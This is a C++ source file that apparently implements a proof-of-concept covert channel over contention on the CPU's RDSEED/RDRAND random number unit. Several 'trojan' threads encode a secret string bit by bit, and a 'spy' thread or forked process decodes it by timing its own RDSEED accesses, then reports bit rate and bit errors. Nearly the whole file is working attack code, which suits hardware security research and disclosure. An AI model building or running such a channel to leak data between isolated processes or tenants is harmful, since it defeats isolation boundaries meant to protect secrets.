#include <thread>
#include <x86intrin.h>
#include <vector>
#include <iostream>
#include <chrono>
#include <future>
#include <math.h>
#include <sys/types.h>
#include <unistd.h>
using namespace std;
using namespace std::chrono;
#include <immintrin.h>

#define RDRAND __builtin_ia32_rdrand32_step
#define RDSEED __builtin_ia32_rdseed_di_step
#define TYPE long long unsigned int //compiler wont compile if uint64_t ... long long unsigned int *can* be 32 bits on platforms, gcc implements this interface with long long..

#ifndef DRNG_OP
#define DRNG_OP RDSEED
#endif


const char * secret_string = "hello, world!";
const int NUM_TROJAN_THREADS = 4;
const int RECV_SIDE_RNGOP_CNT = 4;
const int RECV_SIDE_PAUSE_CNT = 16;
const int RECV_SIDE_SAMPLE_CNT = 2048;
double SEND_PRIME_PERIOD  = 0.5;
double RECV_PROBE_PERIOD  = 0.5;
const double RECV_SYNC_PERIOD   = 0.5;
const double SEND_SYNC_PERIOD   = 0.5;
double CLASSIFICATION_THRESHOLD   = 0.002;
bool seperate_process = false;
bool verbose = false;
bool dump_probe_timings = false;
string isolation_mode = "thread";
string msg;
double elapsed_time;
double *probe_timings;
string verbose_mode = "summary-only";

//Synchronize threads...
static atomic_int rdy;
void SYNC_START()
{
    rdy++;
    while(rdy < (NUM_TROJAN_THREADS+1))
        ;
}

void transmission_quality_report(string expected_str, double * probe_results, double elapsed_time)
{
    int j=0;
    int n_incorrect_bits = 0;
    for(auto & c : expected_str) {
        int incorrect_bits = 0;
        short received = 0;
        if(verbose)
            cout << "expected character: " << (char) c;
        for(int bit = 0; bit < 8; bit++) {
            int sample          = j++;
            double bit_delay    = probe_results[sample];
            int decoded_bit     = bit_delay >= CLASSIFICATION_THRESHOLD;
            int encoded_bit     = (c >> bit) & 1;
            received |= (decoded_bit << bit);
            if(decoded_bit != encoded_bit)
                incorrect_bits++;
            if(!verbose) continue;
            cout << "---- bit " << bit << " [ probe_time: " << bit_delay;
            cout << ", encoded_bit: " << encoded_bit;
            cout << ", decoded_bit: " << decoded_bit;
            cout << "]" << endl;
        }
        n_incorrect_bits+=incorrect_bits;
        if(!verbose) continue;
        cout << "---- received: " << (char) received;
        cout << "    (hd : " << incorrect_bits << ")" << endl; 
    }
    cout << "# summary----------" << endl; 
    cout << "# bit_rate:        " << 8 * expected_str.size() / elapsed_time << " bps" << endl;
    cout << "# incorrect bits:  " << n_incorrect_bits << "/" << 8*expected_str.size() << endl;
    cout << "#------------------" << endl;
    if(!dump_probe_timings) return;
    int s = 0;
    cout << "sample,result,expected_val" << endl;
    for(auto & c : expected_str) {
        auto sc = (short) c;
        int sample = s++;
        for(int b = 0; b < 8; b++) {
            int val = (sc >> b) & 1;
            cout << sample << "," << probe_results[sample] << "," << val << endl;
        }
    }
}

void prime_one(void)
{
    TYPE val;
    high_resolution_clock::time_point start = high_resolution_clock::now();
    high_resolution_clock::time_point done = high_resolution_clock::now();
    auto dur = duration_cast<duration<double>>(done-start);
    do {
        DRNG_OP(&val);	
        done = high_resolution_clock::now();
        dur = duration_cast<duration<double>>(done-start);
    } while(dur.count() <= SEND_PRIME_PERIOD);
    return;
}

void prime_zero(void)
{
    high_resolution_clock::time_point start = high_resolution_clock::now();
    high_resolution_clock::time_point done = high_resolution_clock::now();
    TYPE val;
    auto dur = duration_cast<duration<double>>(done-start);
    do {
        asm("pause");
        done = high_resolution_clock::now();
        dur = duration_cast<duration<double>>(done-start);
    } while(dur.count() < SEND_PRIME_PERIOD);
    return;
}

void trojan_send_str(string m)
{
    SYNC_START();
    for (auto & c : m) {
        short secret    = (short) c;
        for(int i = 0; i < 8; i++) {
            if(secret & 1)
                prime_one();
            else
                prime_zero();
            secret = secret >> 1;
        } 
    }
    return;
}

//This is the probe function for receivers
double recv_probe()
{
    //Probe availability measure channel availability
    //Number of successfull accesses is the "availability" measure
    auto probe_availability = []() {
        TYPE val[64];
        int rv = 0;
        for(int o = 0; o < RECV_SIDE_RNGOP_CNT; o++)
            rv+=DRNG_OP(&val[o]);
        return rv;
    };
    //delay enforced in between channel probes
    auto inter_channel_probe_delay = []() {
        for(int p = 0; p < RECV_SIDE_PAUSE_CNT; p++)
            asm("pause");
    };

    // probe-delay until RECV_SIDE_SAMPLE_CNT successful DRNG operations
    auto start_time = high_resolution_clock::now();
    int cnt = RECV_SIDE_SAMPLE_CNT;
    do {
        cnt -= probe_availability();
        inter_channel_probe_delay();
    } while(cnt > 0);
    auto done_time = high_resolution_clock::now();

    auto probe_latency = duration_cast<duration<double>>(done_time-start_time);
    return probe_latency.count();
}

void recv_wait_for_next_transmission(double probe_time)
{
    auto rem_probe_period = RECV_PROBE_PERIOD - probe_time;
    auto start = high_resolution_clock::now();
    auto elapsed_time = 0.0;
    do {
        asm("pause");
        auto now = high_resolution_clock::now();
        elapsed_time = duration_cast<duration<double>>(now-start).count();
    } while(elapsed_time < rem_probe_period );
    return;
}

double spy_recv_str(int len, double * data)
{
    auto t_start = high_resolution_clock::now();
    SYNC_START();
    //For each character 8 probes are necessary -- one for each bit
    for(int s = 0; s < len*8; s++) {
        auto probe_time = recv_probe();
        data[s] = probe_time;
        recv_wait_for_next_transmission(probe_time);
    }
    auto t_done = high_resolution_clock::now();
    return duration_cast<duration<double>>(t_done-t_start).count();
}

double bcast_secret_str(const string & m, double *probe_timings)
{
    //Allocate probe_timings array and launch spy function
    auto r1 = async(launch::async, spy_recv_str, m.size(), probe_timings);

    //Launch concurrent trojan threads
    array<future<void>, NUM_TROJAN_THREADS> trojans;
    for(int i = 0; i < NUM_TROJAN_THREADS; i++) 
        trojans[i] = async(launch::async, trojan_send_str, m);

    //Wait for the spy to finish collecting data
    return r1.get();
}
void setup(int argc, char**argv)
{
    auto usage = [&]() {
        cout << "usage: " << argv[0] << "[mode] [verbose] [threshold]" << endl;
        cout << "   mode        -- how to seperate trojan and spy                       -- thread,process   -- default: thread " << endl;
        cout << "   verbose     -- set verbose to report each individual probe-result   -- 0/1              -- default: 0 " << endl;
        cout << "   threshold   -- probe-latency threshold which is decoded as a 1      -- (decimal value)  -- default: 0.5 " << endl;
        cout << "   dump        -- dump probe results                                   -- 0/1              -- default: 0 " << endl;
    };
    if (argc == 1) {
        verbose             = false;
        dump_probe_timings  = false;
        verbose_mode        = "summary-only";
        isolation_mode      = "thread";
        CLASSIFICATION_THRESHOLD   = 0.5;
    }
    else if(argc == 7) {
        seperate_process = string(argv[1]) == "process";
        if(!seperate_process && string(argv[1]) != "thread") {
            usage();
            exit(-1);
        }
        if(seperate_process)
            isolation_mode = "process";

        if(string(argv[2]) == "1") {
            verbose_mode    = "full-report";
            verbose         = true;
        }
        CLASSIFICATION_THRESHOLD = atof(argv[3]);
        dump_probe_timings = atoi(argv[4]) == 1;
        SEND_PRIME_PERIOD = atof(argv[5]);
        RECV_PROBE_PERIOD = atof(argv[6]);
    } else {
        usage();
        exit(-1);
    }
    msg = secret_string;
    probe_timings = (double *) malloc (sizeof(double) * 8*msg.size());
    elapsed_time = 0.0;
    //TODO: elucidate the threat model by disabling mmap/malloc for this process
    cout << "# broadcasting \"" << msg << "\" (" << isolation_mode << "-isolation) (";
    cout << "# verbose_report=" << verbose_mode << ") (";
    cout << "# decoding_threshold=" << CLASSIFICATION_THRESHOLD << ")" << endl;
}
int main(int argc, char**argv) {
    setup(argc,argv);

    if(!seperate_process) {
        elapsed_time = bcast_secret_str(msg, probe_timings);
        transmission_quality_report(secret_string,probe_timings,elapsed_time);
        return 0;
    }

    if(fork() == 0) {
        //Launch concurrent trojan threads in child process
        rdy = 1; //Pretend like spy in parent process is ready
        array<future<void>, NUM_TROJAN_THREADS> trojans;
        for(int i = 0; i < NUM_TROJAN_THREADS; i++) 
            trojans[i] = async(launch::async, trojan_send_str, msg);
        return 0;
    }

    rdy = NUM_TROJAN_THREADS; //Pretend like trojans in child are ready..
    auto r1 = async(launch::async, spy_recv_str, msg.size(), probe_timings);
    elapsed_time = r1.get();
    transmission_quality_report(secret_string,probe_timings,elapsed_time);
    free(probe_timings);
}
